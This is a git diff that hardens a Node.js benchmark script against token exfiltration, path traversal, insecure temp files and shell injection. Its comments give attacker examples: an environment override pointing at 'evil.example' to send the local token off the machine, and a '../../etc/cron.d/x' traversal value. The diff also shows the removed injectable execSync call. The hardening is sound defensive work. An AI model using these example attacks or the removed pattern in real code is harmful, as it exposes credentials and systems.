@@ -6,15 +6,34 @@
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { execSync } from 'node:child_process';
+import { execFileSync } from 'node:child_process';
+import { assertSafeGitRef } from './argv-safety.cjs';
 
-const API = process.env.AIFACTORY_API_URL || 'http://localhost:3101';
+// AIFACTORY_API_URL is an environment variable and every request below carries
+// the token read from ~/.aifactory/.token. Pin it to loopback: otherwise
+// `AIFACTORY_API_URL=http://evil.example node scripts/benchmark-provider.mjs`
+// posts that token straight off the machine. This is a local benchmark
+// harness -- port-forward anything remote.
+const LOOPBACK = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);
+const API = (() => {
+  const raw = process.env.AIFACTORY_API_URL || 'http://localhost:3101';
+  const host = new URL(raw).hostname;
+  if (!LOOPBACK.has(host)) {
+    throw new Error(`AIFACTORY_API_URL=${raw}: refusing to send the local API token to ${host}; port-forward to localhost instead`);
+  }
+  return raw;
+})();
 const PID = process.env.AIFACTORY_PROJECT_ID || 'f7ac8d99-b913-4c6f-afce-f8376e29c98c';
 const TOKEN = fs.readFileSync(path.join(os.homedir(), '.aifactory', '.token'), 'utf8').trim();
 const MODEL = process.env.DEMO_MODEL || 'sonnet';
-const PROVIDER = process.env.DEMO_PROVIDER || 'claude';
+// Becomes a filename below, so keep it one path segment: DEMO_PROVIDER is an
+// environment variable and `../../etc/cron.d/x` would otherwise escape OUT.
+const PROVIDER = (process.env.DEMO_PROVIDER || 'claude').replace(/[^A-Za-z0-9._-]/g, '_');
 const DEADLINE_MIN = +(process.env.DEMO_DEADLINE_MIN || 25);
-const OUT = process.env.OUT || '/tmp/aifactory-bench';
+// A fixed /tmp path lets any local user pre-create it as a symlink and redirect
+// (or read) the result file — CodeQL js/insecure-temporary-file. mkdtempSync is
+// the atomic, 0700, unpredictable equivalent. Set OUT to pick your own dir.
+const OUT = process.env.OUT || fs.mkdtempSync(path.join(os.tmpdir(), 'aifactory-bench-'));
 const REPO = '/tmp/aifactory-demo';
 fs.mkdirSync(OUT, { recursive: true });
 const log = (...a) => console.log(new Date().toISOString().slice(11, 19), ...a);
@@ -76,9 +95,18 @@ async function api(p, method = 'GET', body) {
   const doneN = subs.filter(s => ['completed', 'done'].includes((s.status || '').toLowerCase())).length;
   let diffstat = '';
   try {
-    diffstat = execSync(
-      `git -C ${REPO} diff --stat main..aifactory/${specId} -- src tests 2>/dev/null`,
-      { encoding: 'utf8' }).trim();
+    // execFileSync, not execSync: specId comes back from the API, and in a
+    // shell string it is a command, not an argument. No shell also means no
+    // `2>/dev/null`, so stderr is simply not captured.
+    //
+    // The argv array stops specId being a command, but not it being a *ref*:
+    // an embedded `..` would rewrite the `main..aifactory/<id>` range it lands
+    // in. assertSafeGitRef is the same rule the Python side applies
+    // (apps/backend/core/workspace/git_utils.py).
+    diffstat = execFileSync(
+      'git',
+      ['-C', REPO, 'diff', '--stat', `main..aifactory/${assertSafeGitRef(specId, 'spec_id')}`, '--', 'src', 'tests'],
+      { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
   } catch {}
   const result = {
     provider: PROVIDER,
